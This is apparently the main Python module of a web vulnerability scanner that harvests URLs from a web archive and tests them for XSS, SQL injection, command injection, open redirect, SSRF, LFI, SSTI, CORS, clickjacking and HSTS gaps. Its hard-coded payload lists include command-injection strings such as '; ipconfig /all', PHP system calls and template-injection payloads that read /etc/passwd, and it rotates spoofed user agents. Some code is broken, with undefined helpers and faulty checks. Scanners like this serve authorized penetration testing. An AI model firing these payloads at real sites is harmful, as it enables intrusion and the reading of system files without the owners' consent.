from urllib import parse as urlparse
from parametizer.params import parametizer, parametizer2
from scanners.scan_xss import xss, xss_params
from scanners.scan_lfi import lfi, lfi_params
from scanners.scan_sqli import sqli, sqli_params
from parametizer.core.save_it import save_output
import sys,os ,requests
from urllib.request import urlopen
from urllib.error import URLError, HTTPError
import random
from scanners.scan_idor import idor
from scanners.scan_rce import rce, rce_params
from scanners.scan_redirect import redirect, redirect_params
from scanners.scan_lfi import lfi, lfi_params
from scanners.scan_ssrf import ssrf, ssrf_params
from scanners.scan_ssti import ssti, ssti_params
import random
import signal

user_agents = [
 "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
 "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
 "Mozilla/3.01 (Macintosh; PPC)",
 "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",  
 "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",  
 "Opera/8.00 (Windows NT 5.1; U; en)",  
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
]

user_agent = random.choice (user_agents)

def parametizer3(url,threads):
    
    print('\033[1;33mSearch parameters:\n\033[0m')

    url = f"https://web.archive.org/cdx/search/cdx?url=*.{url}/*&output=txt&fl=original&collapse=urlkey&page=/"    
    retry = True
    retries = 0
    while retry == True and retries <= int(3):
             response, retry = requester.connector(url)
             retry = retry
             retries   += 1
    if response == False:
         return 
    response = unquote(response)   

    urls= extractor.param_extract(response)
    print(urls)
    print(f"\033[1;32m[+] Total urls found : {len(urls)}\033[1;31m")
    return urls

    

def all_list(l,c,cl,h,x,lf,s,i,r,rc,sr,sst,output,fname,o,vulnerables_urls,op,params,threads):   
 
 indice=0
 p=True
 while indice < len(l):
     
     linea=l[indice]
          
     print()
     print('---------------------')
     print("\033[1;36m" + linea + '\033[0;m')
     print('---------------------')
     print()
    
     try:

         if 'http://' in linea:
             pass
         elif 'https://' in linea:
             for line in linea:
                 linea = linea.replace('https://', 'http://')
         else:
             linea = 'http://' + linea
         try:
             req=requests.get(linea, timeout=10.0) #Opens the url
             headers=req.headers 
         except URLError as e:
             for line in linea:
                 linea = linea.replace('http://', 'https://')
             try:    
                 req=requests.get(linea,timeout=10.0)
                 headers=req.headers
             except URLError:        
                 print(f'\033[1;31{req.status_code} [?] open Url Error\033[0m')
                 indice+=1
         try:                          
                if h:   
                        p=False
                        if 'strict-transport-security' not in headers:
                            print ('\033[1;32m[+]\033[0m ' + linea + ' \033[1;32mNot force HSTS\033[0m')
                            vulnerables_urls.append('\n****************** VULNERABLE TO HSTS: *********************\n')
                            vulnerables_urls.append(linea)      
                        else:
                            print ('\033[1;31m[-]\033[0m ' + linea + ' \033[1;31mHSTS is OK\033[0m')  
                if cl:  
                        p=False  
                        if 'x-frame-options' not in headers:
                            if 'content-security-policy' not in headers:
                                print ('\033[1;32m[+]\033[0m ' + linea + ' \033[1;32mvulnerable to Clickjacking\033[0m')
                                vulnerables_urls.append('\n****************** VULNERABLE TO CLICKJACKING: *********************\n')
                                vulnerables_urls.append(linea)
                            else:
                                print ('\033[1;31m[-]\033[0m '  + linea + ' \033[1;31mis not vulnerable to Clickjacking\033[0m')
                        else:
                            print ('\033[1;31m[-]\033[0m '  + linea + ' \033[1;31mis not vulnerable to Clickjacking\033[0m')            
                if c:           
                            p=False
                            headers2 = {"Origin": "https://evil.com"}
                            
                            req2=requests.get(linea,headers=headers2,timeout=50)
                            if 'access-control-allow-origin' in req2.headers:
                                if 'https://evil.com' in req2.headers:
                                    print ('\033[1;32m[+]\033[0m ' + linea + ' \033[1;32mis vulnerable to Cors\033[0m')
                                    vulnerables_urls.append('\n****************** VULNERABLE TO CORS: *********************\n') 
                                    vulnerables_urls.append(linea)                           
                                else:
                                    print ('\033[1;31m[-]\033[0m ' + linea + ' \033[1;31mis not vulnerable to Cors\033[0m')
                            else:
                                print ('\033[1;31m[-]\033[0m ' + linea + ' \033[1;31mis not vulnerable to Cors\033[0m')
         except:
             pass

         try: 
             uri=[]
             uri.append(linea)
             if p:
                 parametizer(linea,output,threads)
                 with open(output, "r") as f:
                        for q in f.readlines():
                            q = q.strip()
                            if q == "" or q.startswith("#"):
                                pass
                            uri.append(q)
                                        
         except:
             indice+=1
             continue                     
         
         if x:
             #uri=[]
             wordlist=['"><script>confirm(1)</script>','<h1>NELUXMATIZER</h1>']
             #parametizer(linea,output,threads)
             if op:
                     xss_params(uri,params,threads)
             else:                                             
                     print()        
                     print('\033[1;33mTest xss for default payload:\033[0m')       
                     xss(uri,wordlist,vulnerables_urls,threads)          
             
         if s:
             #uri=[]
             wordlist=["%27"]
             #parametizer(linea,output,threads)   
             if op:
                     sqli_params(uri,params,threads)
             else:                                     
                     print()        
                     print('\033[1;33mTest sqli for default payload:\033[0m')
                     print()        
                     sqli(uri,wordlist,vulnerables_urls,threads)           

         if i and op:
             #uri=[]
             wordlist=['']   
             #parametizer(linea,output,threads)
             print()        
             print('\033[1;33mSearch idor parameters:\033[0m')
             print()        
             idor(uri,wordlist,vulnerables_urls,threads)           
    
         if rc:
             #uri=[]
             wordlist=['| ipconfig /all','; ipconfig /all','& ipconfig /all','| ifconfig',
             '& ifconfig', '; ifeconfig','&& ifconfig','system("cat /etc/passwd");','system("cat /etc/passwd");'
             ]
             #parametizer(linea,output,threads)
             if op:
                     rce_params(uri,params,threads)
             else:                                             
                     print()        
                     print('\033[1;33mTest rce for default payload:\033[0m')       
                     rce(uri,wordlist,vulnerables_urls,threads)           
         if r: 
             #uri=[]
             wordlist=['////google.com/','////google.com/','https:///google.com/','/https:google.com','<>javascript:alert(1);','http:///////////google.com','javascript:alert(1)']
             #parametizer(linea,output,threads)                             
             if op:
                         redirect_params(uri,params,threads)
             else:                                           
                         print()        
                         print('\033[1;33mTest redirect for default payload:\033[0m')       
                         redirect(uri,wordlist,vulnerables_urls,threads)           
             
         if sr:
             #uri=[]
             wordlist=['file:///etc/passwd','file://\/\/etc/passwd']   
             #parametizer(linea,output,threads)
             if op:
                     ssrf_params(uri,params,threads)
             else:                                     
                     print()        
                     print('\033[1;33mTest SSRF for default payloads:\033[0m')
                     print()        
                     ssrf(uri,wordlist,vulnerables_urls,threads)           
             
         if lf:
             #uri=[]
             wordlist=['../../../../../../../../../../../../../../../../../../../../../../etc/passwd']   
            #parametizer(linea,output,threads)
             if op:
                     lfi_params(uri,params,threads)
             else:
                     print()        
                     print('\033[1;33mTest lfi for default payload:\033[0m')
                     print()        
                     lfi(uri,wordlist,vulnerables_urls,threads)           
             
         if sst:
             #uri=[]
             wordlist=["<%= File.open('/etc/passwd').read %>","${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}"]   
             #parametizer(linea,output,threads)
             if op:
                     ssti_params(uri,params,threads)
             else:
                     print()        
                     print('\033[1;33mTest ssti for default payloads:\033[0m')
                     print()        
                     ssti(uri,wordlist,vulnerables_urls,threads)           
             
     except:
         print()
         print("\033[1;36m"+" CLOSE PROGRAM " + '\033[0;m')
         indice=len(l)
         pass      
           
      
     if o:
         save_output(vulnerables_urls,fname,linea)    
     if op:
         save_output(params,fname,linea)              
     indice+= 1


